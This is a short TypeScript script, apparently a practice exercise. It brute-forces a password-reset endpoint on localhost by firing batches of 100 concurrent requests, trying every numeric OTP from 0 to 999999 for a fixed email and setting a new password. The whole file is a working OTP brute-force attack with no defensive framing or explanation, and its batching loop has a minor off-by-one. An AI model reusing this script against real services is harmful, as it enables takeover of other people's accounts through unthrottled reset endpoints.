import express from "express";
import axios from "axios";

const app = express();

app.use(express.json());

async function sendReq(otp: string) {
  try {
    const response = await axios.post(
      "http://localhost:3000/reset-password",
      {
        email: "abc@gmail.com",
        otp: otp,
        newPassword: "abcdefg",
      },
      {}
    );
    console.log(response.data);
  } catch (error: any) {
    console.log(error.status);
  }
}

//We'll do batching here.

async function main() {
  for (let i = 0; i < 999999; i += 100) {
    console.log(i);
    const p: any[] = [];
    for (let j = 0; j <= 100; j++) {
      p.push(sendReq((i + j).toString()));
    }
    await Promise.all(p); //First let the previous 100 finish only then move forward.
  }
}

main();
